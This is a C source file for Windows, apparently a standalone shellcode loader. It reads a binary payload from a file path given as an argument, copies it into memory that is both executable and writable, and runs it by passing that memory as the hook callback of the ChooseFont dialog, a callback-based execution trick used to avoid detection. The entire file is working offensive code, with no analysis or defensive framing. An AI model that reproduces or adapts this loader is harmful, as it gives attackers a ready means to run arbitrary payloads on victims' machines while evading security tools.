#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "Comdlg32.lib") // include choosefont

BOOL LoadShellcodeFromFile(PWSTR filePath, PCHAR* shellcodeBuffer, PDWORD shellcodeSize);

INT wmain(INT argCount, WCHAR* argValues[]) //main func
{
    BOOL operationSuccess = FALSE;
    DWORD shellcodeLength = 0;
    PCHAR shellcodeData = NULL;
    PVOID allocatedMemory = NULL;

    if (argCount != 2)
    {
        printf("usage: ChooseFont.exe C:\\Path\\To\\Shellcode.bin\n");
        return 1;  
    }

    operationSuccess = LoadShellcodeFromFile(argValues[1], &shellcodeData, &shellcodeLength);
    if (!operationSuccess || shellcodeData == NULL || shellcodeLength == 0)
    {
        printf("failed to read shellcode file.\n");
        return 1;
    }

    allocatedMemory = VirtualAlloc(NULL, shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL)
    {
        printf("VirtualAlloc failed\n");
        free(shellcodeData);
        return 1;
    }

    memcpy(allocatedMemory, shellcodeData, shellcodeLength);

    CHOOSEFONT fontDialog = { 0 };
    fontDialog.lStructSize = sizeof(fontDialog);
    fontDialog.Flags = CF_ENABLEHOOK; // enable lpfn hook
    fontDialog.lpfnHook = (LPCFHOOKPROC)allocatedMemory;  // shellcode is already written in allocatedMemory

    if (!ChooseFont(&fontDialog))
    {
        printf("Error: ChooseFont failed.\n");
    }


    free(shellcodeData);
    return 0;
}

BOOL LoadShellcodeFromFile(PWSTR filePath, PCHAR* shellcodeBuffer, PDWORD shellcodeSize)
{
    FILE* fileHandle = NULL;
    errno_t fileOpenStatus = _wfopen_s(&fileHandle, filePath, L"rb");

    if (fileOpenStatus != 0 || fileHandle == NULL)
    {
        printf("unable to open file.\n");
        return FALSE;
    }

    if (fseek(fileHandle, 0, SEEK_END) != 0)
    {
        printf("fseek failed.\n");
        fclose(fileHandle);
        return FALSE;
    }

    *shellcodeSize = ftell(fileHandle);
    if (*shellcodeSize <= 0)
    {
        printf("invalid file size.\n");
        fclose(fileHandle);
        return FALSE;
    }

    rewind(fileHandle);  

    *shellcodeBuffer = (PCHAR)malloc(*shellcodeSize);
    if (*shellcodeBuffer == NULL)
    {
        printf("memory allocation failed.\n");
        fclose(fileHandle);
        return FALSE;
    }


    size_t bytesRead = fread(*shellcodeBuffer, 1, *shellcodeSize, fileHandle);
    if (bytesRead != *shellcodeSize)
    {
        printf("file read incomplete.\n");
        free(*shellcodeBuffer);
        fclose(fileHandle);
        return FALSE;
    }

    fclose(fileHandle);
    return TRUE;
}
